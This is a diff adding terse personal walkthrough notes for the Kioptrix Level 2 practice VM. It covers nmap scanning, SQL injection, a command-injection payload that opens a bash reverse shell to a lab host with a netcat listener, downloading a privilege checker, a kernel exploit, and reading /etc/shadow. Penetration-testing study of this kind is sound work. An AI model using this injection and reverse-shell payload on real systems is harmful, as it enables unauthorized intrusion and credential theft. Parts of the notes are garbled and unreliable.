@@ -1,0 +1,14 @@
+> Kioptrix Level 2
+1 > nmap 192.168.10.129
+2 > sudo nmap -nvv -Pn- -sSV -p 22,80,111,443,631,3306 --version-intensity 9 -A -oN /root/kiotrix.txt 192.168.10.129
+3 > port > 80 
+  open http > try > SQL injuction > it works
+  try to run commands > like > pwd
+  not root privlage:id > try privilage esclation
+  >> in the input field in webpage : ping > 172.0.0.1 ; bash -i >& /dev/tcp/192.168.10.128/4444 0>&1
+  >> listner on kali using netcat > nc -nvlp 4444 >> DONE!!!!! first step
+ 4 >download LinuxPrivChecker.py and deliver by wget to machine ?
+  >> run and show result > check kernal version exploit 
+  >> exploit work and get root privlage 
+  >> we can now show /ETC/SHADOW file for look for other password 
+ 5 > we can change root hash password from /etc/passwod and get root privlage
